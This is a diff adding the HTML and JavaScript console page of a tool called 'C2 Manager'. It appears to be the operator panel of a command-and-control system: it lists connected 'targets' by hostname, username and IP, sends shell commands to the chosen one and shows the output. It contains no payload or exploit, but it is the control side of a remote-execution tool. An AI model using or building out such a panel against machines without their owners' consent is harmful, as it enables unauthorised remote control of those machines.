@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>C2 Manager | Consola</title>
+    <link rel="stylesheet" href="css/style.css">
+    <script src="https://unpkg.com/@phosphor-icons/web"></script>
+</head>
+
+<body>
+
+    <aside class="sidebar">
+        <div class="logo-area">
+            <div class="logo-icon">C2</div>
+            <div class="logo-text"><span>C2 Manager</span><span class="logo-sub">v2.0.0 Pro</span></div>
+        </div>
+        <div class="menu-label">PRINCIPAL</div>
+        <a href="index.html" class="nav-item"><i class="ph ph-squares-four nav-icon"></i><span>Dashboard</span></a>
+        <a href="consola.html" class="nav-item active"><i
+                class="ph ph-terminal-window nav-icon"></i><span>Consola</span></a>
+        <div class="bottom-actions">
+            <div class="nav-item"><i class="ph ph-moon nav-icon"></i><span>Modo Oscuro</span></div>
+        </div>
+    </aside>
+
+    <main class="main-content" style="display:flex; flex-direction:column;">
+        <header class="header">
+            <div class="welcome-text">
+                <h1>Terminal Remota</h1>
+                <p>Ejecución directa de comandos Shell/CMD.</p>
+            </div>
+            <div class="actions">
+                <div class="status-pill" id="wsStatus">WS: Conectando...</div>
+            </div>
+        </header>
+
+        <div class="card" style="flex:1; display:flex; flex-direction:column; min-height:0;">
+            <div class="card-header">
+                <div style="display:flex; gap:10px; align-items:center;">
+                    <h3 class="card-title">Consola Interactiva</h3>
+                    <select id="destino" class="form-control" style="width:200px; padding:5px;">
+                        <option value="">-- Seleccionar Target --</option>
+                    </select>
+                </div>
+                <div class="actions">
+                    <button class="status-pill"
+                        onclick="document.getElementById('terminalOutput').innerHTML=''">Limpiar</button>
+                </div>
+            </div>
+
+            <div id="terminalOutput" class="terminal"
+                style="flex:1; background:#1e1e2d; color:#0f0; font-family:'Consolas'; font-size:14px; padding:15px; overflow-y:auto; border-radius:6px; margin-bottom:15px;">
+                C2 Shell v2.0 Ready...<br>
+                > _
+            </div>
+
+            <form id="comandoForm" style="display:flex; gap:10px;">
+                <span style="padding:10px; background:#eee; border-radius:6px; font-family:'Consolas';">></span>
+                <input type="text" id="comando" class="form-control" placeholder="Escribe un comando..."
+                    style="font-family:'Consolas';">
+                <button type="submit" id="btnEjecutar" class="action-btn"
+                    style="padding:10px 20px; justify-content:center;">Enviar</button>
+            </form>
+        </div>
+    </main>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        // Lógica específica para la consola interactiva
+        document.addEventListener('DOMContentLoaded', () => {
+            const socket = io();
+            const form = document.getElementById('comandoForm');
+            const input = document.getElementById('comando');
+            const destino = document.getElementById('destino');
+            const term = document.getElementById('terminalOutput');
+            const wsStatus = document.getElementById('wsStatus');
+
+            let selectedClient = null;
+
+            // WebSocket status
+            socket.on('connect', () => {
+                wsStatus.className = 'status-pill success';
+                wsStatus.textContent = 'WS: Online';
+                cargarClientes();
+            });
+
+            socket.on('disconnect', () => {
+                wsStatus.className = 'status-pill error';
+                wsStatus.textContent = 'WS: Offline';
+            });
+
+            // Cargar clientes
+            async function cargarClientes() {
+                try {
+                    const res = await fetch('/api/clientes');
+                    const data = await res.json();
+                    if (data.success) {
+                        destino.innerHTML = '<option value="">-- Seleccionar Target --</option>';
+                        data.clientes.forEach(c => {
+                            const opt = document.createElement('option');
+                            opt.value = c.id;
+                            opt.textContent = `📡 ${c.hostname} (${c.username}@${c.ip})`;
+                            destino.appendChild(opt);
+                        });
+                        // Auto-select if only one
+                        if (data.clientes.length === 1) {
+                            destino.value = data.clientes[0].id;
+                            selectedClient = data.clientes[0];
+                            appendToTerm('>>> Conectado a: ' + selectedClient.hostname, '#0f0');
+                        }
+                    }
+                } catch (e) {
+                    console.error(e);
+                }
+            }
+
+            destino.addEventListener('change', async () => {
+                selectedClient = destino.value ? { id: destino.value } : null;
+                if (selectedClient) {
+                    appendToTerm(`>>> Target seleccionado: ${destino.options[destino.selectedIndex].text}`, '#0f0');
+                }
+            });
+
+            // Enviar comando
+            form.addEventListener('submit', async (e) => {
+                e.preventDefault();
+                const cmd = input.value.trim();
+                if (!cmd) return;
+
+                if (!selectedClient || !selectedClient.id) {
+                    appendToTerm('⚠️ Error: Selecciona un cliente primero', '#ff5555');
+                    return;
+                }
+
+                appendToTerm(`Guest@C2:~$ ${cmd}`, '#fff');
+                input.value = '';
+
+                try {
+                    const res = await fetch('/api/ejecutar-remoto', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            clienteId: selectedClient.id,
+                            comando: cmd
+                        })
+                    });
+                    const data = await res.json();
+
+                    if (!data.success) {
+                        appendToTerm('Error: ' + (data.error || 'Fallo al ejecutar'), '#ff5555');
+                    }
+                    // El resultado llegará por socket
+                } catch (err) {
+                    appendToTerm('Error de red: ' + err.message, '#ff5555');
+                }
+            });
+
+            // Escuchar resultados
+            socket.on('comando-resultado', (data) => {
+                // Solo mostrar si es del cliente seleccionado
+                if (selectedClient && data.clienteId === selectedClient.id) {
+                    if (data.output) {
+                        appendToTerm(data.output, '#ccc');
+                    }
+                    if (data.error) {
+                        appendToTerm('Error: ' + data.error, '#ff5555');
+                    }
+                }
+            });
+
+            // Helper para agregar líneas al terminal
+            function appendToTerm(text, color = '#ccc') {
+                const div = document.createElement('div');
+                div.style.color = color;
+                div.style.fontFamily = 'Consolas, monospace';
+                div.style.whiteSpace = 'pre-wrap';
+                div.style.wordBreak = 'break-all';
+                div.textContent = text;
+                term.appendChild(div);
+                term.scrollTop = term.scrollHeight;
+            }
+
+            // Actualizar clientes cuando hay cambios
+            socket.on('cliente-conectado', () => cargarClientes());
+            socket.on('cliente-desconectado', () => cargarClientes());
+        });
+    </script>
+</body>
+
+</html>
